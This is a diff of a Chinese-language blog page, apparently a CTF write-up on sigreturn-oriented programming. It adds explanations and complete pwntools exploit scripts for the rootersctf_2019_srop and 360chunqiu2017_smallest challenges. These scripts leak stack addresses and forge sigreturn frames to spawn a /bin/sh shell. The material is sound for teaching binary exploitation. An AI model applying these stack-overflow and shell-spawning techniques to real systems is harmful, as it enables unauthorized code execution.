@@ -30,11 +30,20 @@
 <meta property="og:image" content="http://example.com/2024/01/18/srop/image-20240119165236840.png">
 <meta property="og:image" content="http://example.com/2024/01/18/srop/image-20240119165547235.png">
 <meta property="og:image" content="http://example.com/2024/01/18/srop/image-20240119174648117.png">
+<meta property="og:image" content="http://example.com/2024/01/18/srop/image-20240121214607133.png">
+<meta property="og:image" content="http://example.com/2024/01/18/srop/image-20240122174933937.png">
+<meta property="og:image" content="http://example.com/2024/01/18/srop/image-20240122224758203.png">
+<meta property="og:image" content="http://example.com/2024/01/18/srop/image-20240122224915670.png">
+<meta property="og:image" content="http://example.com/2024/01/18/srop/image-20240122225119820.png">
+<meta property="og:image" content="http://example.com/2024/01/18/srop/image-20240122225155024.png">
+<meta property="og:image" content="http://example.com/2024/01/18/srop/image-20240123141950945.png">
+<meta property="og:image" content="http://example.com/2024/01/18/srop/image-20240123170639519.png">
+<meta property="og:image" content="http://example.com/2024/01/18/srop/image-20240124142415229.png">
 <meta property="article:published_time" content="2024-01-18T12:35:46.000Z">
-<meta property="article:modified_time" content="2024-01-19T09:48:00.232Z">
+<meta property="article:modified_time" content="2024-01-24T06:28:29.858Z">
 <meta property="article:author" content="fan fan">
-<meta property="article:tag" content="srop">
 <meta property="article:tag" content="pwn">
+<meta property="article:tag" content="srop">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2023/png/34322964/1703593114113-19ae7c25-ae48-45be-b475-2aebe976d322.png">
   
@@ -276,7 +285,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          5.6k 字
+          9.3k 字
         
       </span>
     
@@ -287,7 +296,7 @@
         
         
         
-          47 分钟
+          78 分钟
         
       </span>
     
@@ -337,7 +346,7 @@
               <p class="note note-info">
                 
                   
-                    本文最后更新于：3 小时前
+                    本文最后更新于：几秒前
                   
                 
               </p>
@@ -391,10 +400,55 @@
 <p>找到syscall的地址</p>
 <p><img src="/2024/01/18/srop/image-20240119165547235.png" srcset="/img/loading.gif" lazyload alt="image-20240119165547235"></p>
 <p>rax&#x3D;15（调用<code>sigreturn</code>）和rax&#x3D;59（调用<code>execv</code>）</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>) <br>mov_rax_sigreturn = <span class="hljs-number">0x4004DA</span>                                               <br>read_addr = <span class="hljs-number">0x4004F1</span>                                                            <br>syscall_ret = <span class="hljs-number">0x400501</span>                                                                                             <br>p = process(<span class="hljs-string">&quot;./ciscn_2019_es_7&quot;</span>)                                                 <br>p.sendline(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(read_addr))<br><span class="hljs-comment">#gdb.attach(p)</span><br>p.recv(<span class="hljs-number">32</span>) <br>stack_addr=u64(p.recv(<span class="hljs-number">8</span>))<br><span class="hljs-comment">#stack_addr=u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br>p.recv(<span class="hljs-number">8</span>)<br><span class="hljs-comment">#pwntools生成Signal Frame</span><br>sigframe = SigreturnFrame()<br>sigframe.rax=constants.SYS_execve<br>sigframe.rdi=stack_addr -<span class="hljs-number">328</span><br>sigframe.rsi=<span class="hljs-number">0x0</span><br>sigframe.rsp=stack_addr<br>sigframe.rip=syscall_ret<br><br><br>payload=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="hljs-number">0</span>)+p64(mov_rax_sigreturn)+p64(syscall_ret)+<span class="hljs-built_in">bytes</span>(sigframe)<br>p.sendline(payload)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;stack_addr:&#x27;</span>,<span class="hljs-built_in">hex</span>(stack_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;/bin/sh_addr:&#x27;</span>,<span class="hljs-built_in">hex</span>(stack_addr-<span class="hljs-number">328</span>))<br>p.interactive()<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>) <br>mov_rax_sigreturn = <span class="hljs-number">0x4004DA</span>                                               <br>read_addr = <span class="hljs-number">0x4004F1</span>                                                            <br>syscall_ret = <span class="hljs-number">0x400501</span>                                                                                             <br>p = process(<span class="hljs-string">&quot;./ciscn_2019_es_7&quot;</span>)                                                 <br>p.sendline(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(read_addr))<br><span class="hljs-comment">#gdb.attach(p)</span><br>p.recv(<span class="hljs-number">32</span>) <br>stack_addr=u64(p.recv(<span class="hljs-number">8</span>))<br><span class="hljs-comment">#stack_addr=u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br>p.recv(<span class="hljs-number">8</span>)<br><span class="hljs-comment">#pwntools生成Signal Frame</span><br>sigframe = SigreturnFrame()<br>sigframe.rax=constants.SYS_execve <span class="hljs-comment">#59</span><br>sigframe.rdi=stack_addr -<span class="hljs-number">328</span><br>sigframe.rsi=<span class="hljs-number">0x0</span><br>sigframe.rsp=stack_addr<br>sigframe.rip=syscall_ret<br><br><br>payload=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="hljs-number">0</span>)+p64(mov_rax_sigreturn)+p64(syscall_ret)+<span class="hljs-built_in">bytes</span>(sigframe)<br>p.sendline(payload)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;stack_addr:&#x27;</span>,<span class="hljs-built_in">hex</span>(stack_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;/bin/sh_addr:&#x27;</span>,<span class="hljs-built_in">hex</span>(stack_addr-<span class="hljs-number">328</span>))<br>p.interactive()<br></code></pre></td></tr></table></figure>
 
 <p><img src="/2024/01/18/srop/image-20240119174648117.png" srcset="/img/loading.gif" lazyload alt="image-20240119174648117"></p>
-<h2 id="rootersctf-2019-srop"><a href="#rootersctf-2019-srop" class="headerlink" title="rootersctf_2019_srop"></a>rootersctf_2019_srop</h2><h2 id="360chunqiu2017-smallest"><a href="#360chunqiu2017-smallest" class="headerlink" title="360chunqiu2017_smallest"></a>360chunqiu2017_smallest</h2>
+<h2 id="rootersctf-2019-srop"><a href="#rootersctf-2019-srop" class="headerlink" title="rootersctf_2019_srop"></a>rootersctf_2019_srop</h2><p><img src="/2024/01/18/srop/image-20240121214607133.png" srcset="/img/loading.gif" lazyload alt="image-20240121214607133"></p>
+<p>跟上道题的区别就是没有回显</p>
+<p>​                              <img src="/2024/01/18/srop/image-20240122174933937.png" srcset="/img/loading.gif" lazyload alt="image-20240122174933937"> </p>
+<p>构造两次srop 第一次读入，第二次执行execve</p>
+<p>以下是第一个栈帧</p>
+<p><img src="/2024/01/18/srop/image-20240122224758203.png" srcset="/img/loading.gif" lazyload alt="image-20240122224758203"></p>
+<p><img src="/2024/01/18/srop/image-20240122224915670.png" srcset="/img/loading.gif" lazyload alt="image-20240122224915670"></p>
+<p>第二个栈帧</p>
+<p><img src="/2024/01/18/srop/image-20240122225119820.png" srcset="/img/loading.gif" lazyload alt="image-20240122225119820"></p>
+<p>最后执行execve(“&#x2F;bin&#x2F;sh”)</p>
+<p><img src="/2024/01/18/srop/image-20240122225155024.png" srcset="/img/loading.gif" lazyload alt="image-20240122225155024"></p>
+<ul>
+<li><p>，需要注意：如果将<code>frame</code>的<code>rip</code>设置为<code>syscall;ret</code>，那么<code>rsp</code>指向地址，就是即将下一个栈帧的栈顶。程序会取<code>rsp</code>指向的地址或指令继续执行</p>
+</li>
+<li><p><code>leave;ret</code>指令的本质是<code>mov rbp rsp;pop rbp;pop rip</code></p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./rootersctf_2019_srop&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;node5.buuoj.cn&#x27;,25389)</span><br>data_addr=<span class="hljs-number">0x402000</span><br>syscall_leave_ret = <span class="hljs-number">0x401033</span><br>pop_rax_syscall_leave_ret = <span class="hljs-number">0x401032</span><br>syscall_addr = <span class="hljs-number">0x401046</span><br><br><span class="hljs-comment">#read(0, data_addr, 0x400)</span><br>frame = SigreturnFrame()<br>frame.rax = <span class="hljs-number">0</span> <span class="hljs-comment"># read </span><br>frame.rdi = <span class="hljs-number">0</span> <span class="hljs-comment"># stdin</span><br>frame.rsi = data_addr<br>frame.rdx = <span class="hljs-number">0x400</span><br>frame.rip = syscall_leave_ret<br>frame.rbp = data_addr + <span class="hljs-number">0x10</span><br><br><span class="hljs-comment">#execve(&quot;/bin/sh&quot;, 0, 0)</span><br>p.sendlineafter(<span class="hljs-string">&quot;Hey, can i get some feedback for the CTF?\n&quot;</span>, flat([<span class="hljs-number">0x88</span> * <span class="hljs-string">&quot;a&quot;</span>, pop_rax_syscall_leave_ret, <span class="hljs-number">0xf</span>, <span class="hljs-built_in">bytes</span>(frame)]))<br><br>frame = SigreturnFrame()<br>frame.rax = <span class="hljs-number">59</span> <span class="hljs-comment"># execve constants.SYS_execve</span><br>frame.rdi = data_addr <span class="hljs-comment"># stdin</span><br>frame.rsi = <span class="hljs-number">0</span><br>frame.rdx = <span class="hljs-number">0</span><br>frame.rip = syscall_addr<br><br>payload = flat([<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>, <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0x10</span>, pop_rax_syscall_leave_ret, <span class="hljs-number">0xf</span>, <span class="hljs-built_in">bytes</span>(frame)])<br><br>p.sendline(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="360chunqiu2017-smallest"><a href="#360chunqiu2017-smallest" class="headerlink" title="360chunqiu2017_smallest"></a>360chunqiu2017_smallest</h2><p><img src="/2024/01/18/srop/image-20240123141950945.png" srcset="/img/loading.gif" lazyload alt="image-20240123141950945"></p>
+<p><img src="/2024/01/18/srop/image-20240123170639519.png" srcset="/img/loading.gif" lazyload alt="image-20240123170639519">这个题就有一个read系统调用，十几行汇编代码，同样是需要用srop伪造栈布局</p>
+<p>观察这段汇编代码，<code>XOR RAX, RAX</code> 将 RAX 寄存器的值与自身进行异或操作。这条指令的结果是，RAX 寄存器的所有位都会被设置为0。效果等同于 <code>MOV RAX, 0</code>，而且发现read是直接从rsp读取(可以理解为偏移是0)</p>
+<p>思路就是首先需要leak一个地址,构造write(1,stack,n)来泄露栈上内容，控制rax为1时，rdi也正好能够为标准输出流，且系统调用号对应write函数，将直接从rsp出写出0x400个字节的数据(<code>read</code>的系统调用号是<code>0``write</code>的系统调用号是<code>1</code>)。</p>
+<p>注意:输入的那一个字节必须是\xb3，因为读入的时候会直接写到rsp处，而这里存的是该函数的返回地址。绕过xor,实现read函数的返回值来控制rax为1并输出栈顶指针所指向的数据</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = p64(start_addr) * <span class="hljs-number">3</span><br>sh.send(payload)<br><span class="hljs-comment">## 修改返回地址为start_addr+3</span><br><span class="hljs-comment">## 这样就可以跳过 xor rax,rax;那么rax=1</span><br><span class="hljs-comment">## 获取堆栈地址</span><br>sh.send(<span class="hljs-string">b&#x27;\xb3&#x27;</span>)<br>stack_addr = u64(sh.recv()[<span class="hljs-number">8</span>:<span class="hljs-number">16</span>])<br>log.success(<span class="hljs-string">&#x27;leak stack addr :&#x27;</span> + <span class="hljs-built_in">hex</span>(stack_addr))<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/18/srop/image-20240124142415229.png" srcset="/img/loading.gif" lazyload alt="image-20240124142415229"></p>
+<p>然后知道了栈地址，就可以伪造栈了，</p>
+<p>我们首先伪造一个read(0,stack_addr,0x400),目的是读取binsh，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## 让 rsp 指向 stack_addr</span><br><span class="hljs-comment">## 读取帧(0,stack_addr,0x400)</span><br>sigframe = SigreturnFrame()<br>sigframe.rax = constants.SYS_read<br>sigframe.rdi = <span class="hljs-number">0</span><br>sigframe.rsi = stack_addr<br>sigframe.rdx = <span class="hljs-number">0x400</span><br>sigframe.rsp = stack_addr<br>sigframe.rip = syscall_ret<br></code></pre></td></tr></table></figure>
+
+<p>再伪造一个栈帧，构造execve(“&#x2F;bin&#x2F;sh”,0,0)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## call execv(&quot;/bin/sh&quot;,0,0)</span><br>sigframe = SigreturnFrame()<br>sigframe.rax = constants.SYS_execve<br>sigframe.rdi = stack_addr + <span class="hljs-number">0x120</span>  <span class="hljs-comment"># &quot;/bin/sh&quot; &#x27;s addr</span><br>sigframe.rsi = <span class="hljs-number">0x0</span><br>sigframe.rdx = <span class="hljs-number">0x0</span><br>sigframe.rsp = stack_addr+ <span class="hljs-number">0x120</span><br>sigframe.rip = syscall_ret<br></code></pre></td></tr></table></figure>
+
+<p>EXP</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>sh = process(<span class="hljs-string">&#x27;./smallest&#x27;</span>)<br><span class="hljs-comment">#sh = remote(&#x27;node5.buuoj.cn&#x27;,28024)</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>syscall_ret = <span class="hljs-number">0x4000BE</span><br>start_addr = <span class="hljs-number">0x4000B0</span><br><br>payload = p64(start_addr) * <span class="hljs-number">3</span><br>sh.send(payload)<br><br><span class="hljs-comment">## 修改返回地址为start_addr+3</span><br><span class="hljs-comment">## 这样就可以跳过 xor rax,rax;那么rax=1</span><br><span class="hljs-comment">## 获取堆栈地址</span><br>sh.send(<span class="hljs-string">b&#x27;\xb3&#x27;</span>)<br><br>stack_addr = u64(sh.recv()[<span class="hljs-number">8</span>:<span class="hljs-number">16</span>])<br><br>log.success(<span class="hljs-string">&#x27;leak stack addr :&#x27;</span> + <span class="hljs-built_in">hex</span>(stack_addr))<br> <br><span class="hljs-comment">## 让 rsp 指向 stack_addr</span><br><span class="hljs-comment">## 读取帧(0,stack_addr,0x400)</span><br>sigframe = SigreturnFrame()<br>sigframe.rax = constants.SYS_read<br>sigframe.rdi = <span class="hljs-number">0</span><br>sigframe.rsi = stack_addr<br>sigframe.rdx = <span class="hljs-number">0x400</span><br>sigframe.rsp = stack_addr<br>sigframe.rip = syscall_ret<br>payload = p64(start_addr) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">8</span> + <span class="hljs-built_in">bytes</span>(sigframe)<br>sh.send(payload)<br> <br><span class="hljs-comment">#输入十五个字节，触发sigreturn 设置 rax=15</span><br>sigreturn = p64(syscall_ret) + <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">7</span><br>sh.send(sigreturn)<br><br><span class="hljs-comment">## call execv(&quot;/bin/sh&quot;,0,0)</span><br>sigframe = SigreturnFrame()<br>sigframe.rax = constants.SYS_execve<br>sigframe.rdi = stack_addr + <span class="hljs-number">0x120</span>  <span class="hljs-comment"># &quot;/bin/sh&quot; &#x27;s addr</span><br>sigframe.rsi = <span class="hljs-number">0x0</span><br>sigframe.rdx = <span class="hljs-number">0x0</span><br>sigframe.rsp = stack_addr+ <span class="hljs-number">0x120</span><br>sigframe.rip = syscall_ret<br> <br> <br><br>frame_payload = p64(start_addr) + <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">8</span> + <span class="hljs-built_in">bytes</span>(sigframe)<br>payload = frame_payload + (<span class="hljs-number">0x120</span> - <span class="hljs-built_in">len</span>(frame_payload)) * <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(stack_addr + <span class="hljs-number">0x190</span>)<br>sh.send(payload)<br><br>sh.send(sigreturn)<br>sh.interactive()<br><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><p>1.<code>srop</code>只用于栈溢出较大的场景，并且程序中需要有系统调用</p>
+<p>2.<code>srop</code>可以构造多个帧，若程序缺乏binsh，第<code>1</code>帧先写<code>/bin/sh\x00</code>，然后第<code>2</code>帧执行<code>execve</code></p>
+
                 
               </div>
             
@@ -427,9 +481,9 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/srop/" class="print-no-link">#srop</a>
-      
         <a href="/tags/pwn/" class="print-no-link">#pwn</a>
+      
+        <a href="/tags/srop/" class="print-no-link">#srop</a>
       
     </div>
   
